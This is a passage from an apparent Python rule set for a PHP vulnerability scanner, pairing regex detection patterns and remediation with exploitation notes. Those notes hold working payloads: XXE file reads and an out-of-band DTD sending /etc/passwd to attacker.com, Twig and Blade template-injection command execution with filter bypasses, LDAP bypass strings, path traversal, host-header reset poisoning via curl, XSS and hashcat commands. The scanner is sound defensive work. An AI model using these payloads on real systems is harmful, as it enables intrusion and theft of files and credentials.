        name="phpinfo() Exposure",
        pattern=r"\bphpinfo\s*\(\s*\)",
        severity=Severity.MEDIUM,
        category="Information Disclosure",
        cwe_id="CWE-200",
        description="phpinfo() exposes sensitive server configuration, paths, and environment variables.",
        exploitation="""
INFORMATION REVEALED:
- PHP version and configuration
- Server paths (DOCUMENT_ROOT, etc.)
- Environment variables (may contain secrets)
- Loaded extensions
- $_SERVER variables
- Cookie values

ALWAYS CHECK:
- /phpinfo.php
- /info.php
- /test.php
- /i.php""",
        remediation="Remove phpinfo() from production code. Restrict access if needed for debugging."
    ),
    SecurityRule(
        id="PHP-INFO-002",
        name="Error Display Enabled",
        pattern=r"(display_errors|error_reporting)\s*\(\s*(1|true|E_ALL|on)",
        severity=Severity.LOW,
        category="Information Disclosure",
        cwe_id="CWE-209",
        description="Error display enabled may reveal sensitive paths and code structure.",
        exploitation="Trigger errors to reveal file paths, SQL queries, and internal structure.",
        remediation="Set display_errors = Off in production. Log errors instead."
    ),

    # -------------------------------------------------------------------------
    # XXE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-XXE-001",
        name="XML External Entity (XXE)",
        pattern=r"(simplexml_load_string|simplexml_load_file|DOMDocument|XMLReader)\s*[^;]*(\$_GET|\$_POST|\$_REQUEST|file_get_contents)",
        severity=Severity.HIGH,
        category="XML External Entity",
        cwe_id="CWE-611",
        description="XML parsing of user input may allow XXE attacks if external entities are enabled.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  XML EXTERNAL ENTITY (XXE) INJECTION                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

FILE READ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

PHP FILE READ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>

SSRF VIA XXE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

BLIND XXE (OOB):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>

xxe.dtd on attacker server:
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;""",
        remediation="Disable external entities: libxml_disable_entity_loader(true); Use LIBXML_NOENT flag."
    ),

    # -------------------------------------------------------------------------
    # CONFIGURATION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-CONFIG-001",
        name="Dangerous Function Enabled",
        pattern=r"\b(assert|create_function|mb_ereg_replace.*e)\s*\(",
        severity=Severity.MEDIUM,
        category="Misconfiguration",
        cwe_id="CWE-94",
        description="Dangerous PHP functions that can lead to code execution.",
        exploitation="These functions can execute code if user input reaches them.",
        remediation="Disable these functions in php.ini or avoid using them."
    ),
    SecurityRule(
        id="PHP-CONFIG-002",
        name="Weak Cryptographic Function",
        pattern=r"\b(md5|sha1|crypt)\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|password|\$pass)",
        severity=Severity.MEDIUM,
        category="Weak Cryptography",
        cwe_id="CWE-327",
        description="Weak hash function used for passwords.",
        exploitation="""
MD5/SHA1 are fast hashes - easily crackable with rainbow tables or hashcat.

hashcat -m 0 hash.txt wordlist.txt  # MD5
hashcat -m 100 hash.txt wordlist.txt # SHA1

Online crackers: crackstation.net, cmd5.org""",
        remediation="Use password_hash() and password_verify() with PASSWORD_BCRYPT or PASSWORD_ARGON2ID."
    ),
    SecurityRule(
        id="PHP-CONFIG-003",
        name="Database Connection Without TLS",
        pattern=r"mysqli_connect|mysql_connect|pg_connect|PDO\s*\([^)]+\)\s*(?!.*ssl|.*SSL)",
        severity=Severity.LOW,
        category="Misconfiguration",
        cwe_id="CWE-319",
        description="Database connection may not be using TLS encryption.",
        exploitation="Database traffic can be intercepted on the network.",
        remediation="Enable SSL/TLS for database connections."
    ),

    # -------------------------------------------------------------------------
    # HEADER INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-HEADER-001",
        name="HTTP Header Injection",
        pattern=r"\bheader\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$[a-zA-Z_][a-zA-Z0-9_]*\s*\.\s*|\.\s*\$)",
        severity=Severity.MEDIUM,
        category="Header Injection",
        cwe_id="CWE-113",
        description="User input in HTTP headers can allow header injection attacks.",
        exploitation="""
HEADER INJECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Inject additional headers
?redirect=http://example.com%0d%0aSet-Cookie:%20evil=value

# Response splitting (add body)
?redirect=http://example.com%0d%0a%0d%0a<html>Phishing</html>

URL ENCODING:
%0d = CR (\\r)
%0a = LF (\\n)""",
        remediation="Validate/sanitize header values. Use urlencode() for URLs. PHP 5.4+ blocks newlines in headers."
    ),
    SecurityRule(
        id="PHP-HEADER-002",
        name="Open Redirect",
        pattern=r"\bheader\s*\(\s*['\"]Location:\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$[a-zA-Z_])",
        severity=Severity.MEDIUM,
        category="Open Redirect",
        cwe_id="CWE-601",
        description="Redirect to user-controlled URL enables phishing attacks.",
        exploitation="""
OPEN REDIRECT PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

?url=http://attacker.com
?url=//attacker.com
?url=https://legitimate.com@attacker.com
?url=/\\attacker.com
?url=////attacker.com

PHISHING SCENARIO:
1. Send victim: http://trusted.com/redirect.php?url=http://attacker.com/fake-login
2. Victim sees trusted.com in email
3. Victim ends up on attacker's phishing page""",
        remediation="Validate URLs against whitelist. Use relative URLs only. Check parse_url() host."
    ),

    # -------------------------------------------------------------------------
    # LDAP
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-LDAP-001",
        name="LDAP Injection",
        pattern=r"\b(ldap_search|ldap_list|ldap_read|ldap_bind)\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$[a-zA-Z_][a-zA-Z0-9_]*\s*\.\s*|\.\s*\$)",
        severity=Severity.HIGH,
        category="LDAP Injection",
        cwe_id="CWE-90",
        description="LDAP query with user input allows LDAP injection.",
        exploitation="""
LDAP INJECTION PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Authentication bypass
username=*
username=*)(&
password=*)(&

# Filter modification
(&(user=admin)(password=*))
(|(user=admin)(user=*))

# Enumerate users
?user=*)(uid=*))(|(uid=*
?user=admin*""",
        remediation="Escape special characters: *, (, ), \\, NULL. Use parameterized LDAP queries."
    ),

    # -------------------------------------------------------------------------
    # HOST HEADER INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-HOST-001",
        name="Host Header Injection",
        pattern=r"\$_SERVER\s*\[\s*['\"]HTTP_(X_FORWARDED_HOST|X_FORWARDED_FOR|X_FORWARDED_PROTO|HOST|X_ORIGINAL_URL|X_REWRITE_URL)['\"]",
        severity=Severity.MEDIUM,
        category="Host Header Injection",
        cwe_id="CWE-644",
        description="User-controlled HTTP headers used without validation - potential host header injection.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  HOST HEADER INJECTION                                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY:
HTTP_HOST and X-Forwarded-* headers are attacker-controlled!
If used for URL generation, password reset links, redirects - exploitable.

ATTACK SCENARIOS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. PASSWORD RESET POISONING:
   # Victim requests password reset
   # Attacker intercepts and adds:
   X-Forwarded-Host: attacker.com
   
   # Reset email contains: https://attacker.com/reset?token=xxx
   # Victim clicks, attacker gets token

2. WEB CACHE POISONING:
   GET / HTTP/1.1
   Host: target.com
   X-Forwarded-Host: attacker.com
   
   # If cached, all users get poisoned response

3. SSRF VIA HOST HEADER:
   Host: internal-server.local
   # May bypass access controls

TESTING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

curl -H "X-Forwarded-Host: attacker.com" http://target.com/
curl -H "Host: attacker.com" http://target.com/
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin/""",
        remediation="Whitelist allowed hosts. Don't trust X-Forwarded-* headers without validating against known proxies."
    ),

    # -------------------------------------------------------------------------
    # SSTI (Server-Side Template Injection)
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-SSTI-001",
        name="Server-Side Template Injection (Twig)",
        pattern=r"(Twig_Environment|\\Twig\\Environment|createTemplate|loadTemplate)\s*[^;]*(\$_GET|\$_POST|\$_REQUEST|\$content|\$input|\$data|\$body|\$text|\$template|\$tpl)",
        severity=Severity.CRITICAL,
        category="Template Injection",
        cwe_id="CWE-94",
        description="Twig template engine with potentially user-controlled content - SSTI vulnerability.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  SERVER-SIDE TEMPLATE INJECTION (SSTI) - TWIG                                ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY:
If user input is passed to Twig's render/createTemplate, attackers can execute code.

DETECTION PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{{7*7}}                          # Returns 49 if vulnerable
{{7*'7'}}                        # Returns 49 (Twig) or 7777777 (Jinja2)
{{dump(app)}}                    # Dump application object
{{app.request.server.all|join(',')}}  # Dump server vars

RCE PAYLOADS (Twig 1.x):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

{{['cat /etc/passwd']|filter('system')}}

RCE PAYLOADS (Twig 2.x/3.x):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{{['id']|filter('system')}}
{{['cat\\x20/etc/passwd']|filter('exec')}}
{{'ls'|filter('system')}}

FILE READ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{{'/etc/passwd'|file_excerpt(1,30)}}
{{source('/etc/passwd')}}

BYPASS FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{%set a='sy'~'stem'%}{{['id']|filter(a)}}
{{['id'|reverse]|filter('system')}}""",
        remediation="Never pass user input directly to template render. Use sandboxed Twig. Escape all user content."
    ),
    SecurityRule(
        id="PHP-SSTI-002",
        name="Twig Template Rendering",
        pattern=r"->render\s*\(\s*[^,]+,\s*\[[^\]]*['\"]content['\"]\s*=>",
        severity=Severity.MEDIUM,
        category="Template Injection",
        cwe_id="CWE-94",
        description="Twig render with content variable - check if content is user-controlled.",
        exploitation="""
POTENTIAL SSTI:
If 'content' variable contains user input that gets rendered as Twig:

1. Check if content comes from user-uploaded files (markdown, etc.)
2. Check if content is processed through Twig before display
3. Try injecting Twig syntax in content areas

See PHP-SSTI-001 for exploitation payloads.""",
        remediation="Ensure content is escaped or use {{ content|raw }} only for trusted content."
    ),
    SecurityRule(
        id="PHP-SSTI-003",
        name="Blade/Laravel Template Injection",
        pattern=r"(Blade::compileString|view\s*\(\s*[^)]*\$|\{!!\s*\$_)",
        severity=Severity.HIGH,
        category="Template Injection",
        cwe_id="CWE-94",
        description="Laravel Blade template with potential user input.",
        exploitation="""
BLADE SSTI:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If user input reaches Blade compilation:

@php system('id'); @endphp
{!! system('id') !!}
{{ system('id') }}

Note: {{ }} escapes by default, but @php and {!! !!} don't.""",
        remediation="Never compile user input as Blade. Use {{ }} not {!! !!} for user content."
    ),

    # -------------------------------------------------------------------------
    # YAML PARSING
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-YAML-001",
        name="YAML Parsing with User Input",
        pattern=r"(yaml_parse|Yaml::parse|Symfony\\\\Component\\\\Yaml|spyc_load)\s*\([^)]*(\$_GET|\$_POST|\$_REQUEST|\$content|\$input|\$data|file_get_contents)",
        severity=Severity.HIGH,
        category="Insecure Deserialization",
        cwe_id="CWE-502",
        description="YAML parsing with user input can lead to code execution via object instantiation.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  YAML DESERIALIZATION ATTACK                                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY:
Some YAML parsers support object instantiation via !php/object tags.

PAYLOADS (yaml extension):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

!php/object 'O:8:"stdClass":1:{s:1:"a";s:4:"test";}'

# With gadget chains (if vulnerable classes exist):
!php/object |
  O:40:"Illuminate\\Broadcasting\\PendingBroadcast":...

SYMFONY YAML (safe by default in newer versions):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Older versions with PARSE_OBJECT flag:
!!php/object 'O:...'

Check if Yaml::PARSE_OBJECT or Yaml::PARSE_CUSTOM_TAGS is used.""",
        remediation="Use Yaml::parse() without PARSE_OBJECT flag. Never parse untrusted YAML with object support."
    ),

    # -------------------------------------------------------------------------
    # FILE OPERATIONS - MORE PATTERNS
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-FILE-001",
        name="Dynamic File Path Construction",
        pattern=r"(file_get_contents|fopen|readfile|include|require|file)\s*\(\s*['\"]?[^'\"]+['\"]?\s*\.\s*\$",
        severity=Severity.HIGH,
        category="Path Traversal",
        cwe_id="CWE-22",
        description="File operation with path constructed from variable - potential path traversal.",
        exploitation="""
PATH TRAVERSAL:
Even if $variable is validated, check for bypass:

PAYLOADS:
- ../../../etc/passwd
- ....//....//....//etc/passwd
- ..%2f..%2f..%2fetc/passwd
- /etc/passwd%00.php (null byte, old PHP)

Look for:
- Insufficient path normalization
- Double encoding bypass
- Null byte injection (PHP < 5.3.4)""",
        remediation="Use realpath() and verify path starts with expected directory."
    ),
    SecurityRule(
        id="PHP-FILE-002",
        name="User Input in File Path",
        pattern=r"\$this->(getContentDir|getThemesDir|getPluginsDir|getConfigDir)\s*\(\s*\)\s*\.\s*\$",
        severity=Severity.HIGH,
        category="Path Traversal",
        cwe_id="CWE-22",
        description="CMS directory method combined with variable - check path traversal protection.",
        exploitation="""
CMS PATH TRAVERSAL:
Framework methods return base directories. If combined with user input:

1. Check if path is normalized
2. Test: ?page=../../../etc/passwd
3. Test: ?theme=../../../etc/passwd
4. Test: ?plugin=../../../etc/passwd

Double-check getNormalizedPath or similar functions for bypasses.""",
        remediation="Ensure path normalization handles all edge cases. Whitelist allowed values."
    ),

    # -------------------------------------------------------------------------
    # REQUEST URI / QUERY STRING
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-URI-001",
        name="REQUEST_URI Used for File Operations",
        pattern=r"\$_SERVER\s*\[\s*['\"]REQUEST_URI['\"]\s*\].*\b(include|require|file_get_contents|fopen|readfile)",
        severity=Severity.HIGH,
        category="File Inclusion",
        cwe_id="CWE-98",
        description="REQUEST_URI used in file operations - potential LFI.",
        exploitation="REQUEST_URI is user-controlled. Test path traversal payloads.",
        remediation="Never use REQUEST_URI directly in file operations."
    ),
    SecurityRule(
        id="PHP-URI-002",
        name="QUERY_STRING Used in Application Logic",
        pattern=r"\$_SERVER\s*\[\s*['\"]QUERY_STRING['\"]\s*\]",
        severity=Severity.LOW,
        category="Input Handling",
        cwe_id="CWE-20",
        description="Raw QUERY_STRING access - check how it's used in application logic.",
        exploitation="""
QUERY_STRING is user-controlled. If used for:
- File paths: LFI possible
- URLs: Open redirect/SSRF possible
- Includes: RCE possible

Check the flow of this data through the application.""",
        remediation="Use proper input validation. Prefer $_GET for individual parameters."
    ),

    # -------------------------------------------------------------------------
    # MARKDOWN / CONTENT PARSING
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-MARKDOWN-001",
        name="Markdown Parser with User Content",
        pattern=r"(Parsedown|Markdown|MarkdownExtra|CommonMark|League\\\\CommonMark)\s*[^;]*->\s*(text|parse|convert|render)\s*\(",
        severity=Severity.MEDIUM,
        category="Content Injection",
        cwe_id="CWE-79",
        description="Markdown parsing - check for XSS if raw HTML is enabled, or SSTI if processed through template.",
        exploitation="""
MARKDOWN SECURITY ISSUES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. XSS VIA RAW HTML (if not sanitized):
   <script>alert(1)</script>
   <img src=x onerror=alert(1)>
   [xss](javascript:alert(1))

2. SSTI (if Markdown output goes to template engine):
   Check if {{ }} or {% %} is preserved through Markdown
   Try: {{7*7}} in content

3. LINK INJECTION:
   [Click me](javascript:alert(1))
   [Click](data:text/html,<script>alert(1)</script>)

4. INFORMATION DISCLOSURE:
   Check if local file links work: [file](file:///etc/passwd)""",
        remediation="Use setSafeMode(true) or strip HTML. Escape template syntax before/after Markdown parsing."
    ),

    # -------------------------------------------------------------------------
    # DEBUGGING/DEVELOPMENT
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-DEBUG-001",
        name="Debug Mode Check",
        pattern=r"['\"]debug['\"]\s*=>\s*true|debug\s*=\s*true|\$debug\s*=\s*true|PICO_DEBUG|APP_DEBUG",
        severity=Severity.LOW,
        category="Information Disclosure",
        cwe_id="CWE-489",
        description="Debug mode may be enabled - verify it's disabled in production.",
        exploitation="""
DEBUG MODE EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Debug mode typically exposes:
- Stack traces with file paths
- SQL queries
- Environment variables
- Template errors with code snippets

TESTING:
- Cause errors to see verbose output
- Check for debug endpoints (/debug, /_profiler)
- Look for Twig debug enabled ({{ dump(app) }})""",
        remediation="Disable debug mode in production. Set APP_DEBUG=false, debug=false."
    ),

    # -------------------------------------------------------------------------
    # CMS SPECIFIC PATTERNS
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-CMS-001",
        name="Plugin/Theme Loading from User Input",
        pattern=r"(loadPlugin|loadTheme|setTheme|getTheme|getPlugin)\s*\([^)]*\$",
        severity=Severity.HIGH,
        category="Path Traversal",
        cwe_id="CWE-22",
        description="CMS plugin/theme loading with variable - check for path traversal.",
        exploitation="""
PLUGIN/THEME PATH TRAVERSAL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If theme/plugin name comes from user input:

?theme=../../../../../../etc/passwd%00
?plugin=../../../config/database

May allow reading arbitrary files or loading malicious code.

TESTING:
1. Find where theme/plugin is specified (URL, config, meta)
2. Try path traversal in that parameter
3. Check for null byte injection""",
        remediation="Whitelist allowed plugins/themes. Never use user input directly in file paths."
    ),
    SecurityRule(
        id="PHP-CMS-002",
        name="Meta Header Processing",
        pattern=r"(meta|getMeta|parseMeta|getMetaHeaders)\s*\[",
        severity=Severity.LOW,
        category="Content Injection",
        cwe_id="CWE-94",
        description="Meta/header parsing from content files - check if values are properly sanitized.",
        exploitation="""
META HEADER ATTACKS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If meta headers control behavior:

1. TEMPLATE INJECTION via Template: header
   ---
   Template: ../../../../../../etc/passwd
   ---

2. REDIRECT via meta headers
   ---
   Redirect: http://evil.com
   ---

3. XSS via meta values displayed in page

Check what meta headers are supported and how they're used.""",
        remediation="Validate meta header values. Whitelist allowed templates. Sanitize for output."
    ),
]


# Summary statistics
PHP_RULE_CATEGORIES = list(set(r.category for r in PHP_SECURITY_RULES))
PHP_TOTAL_RULES = len(PHP_SECURITY_RULES)
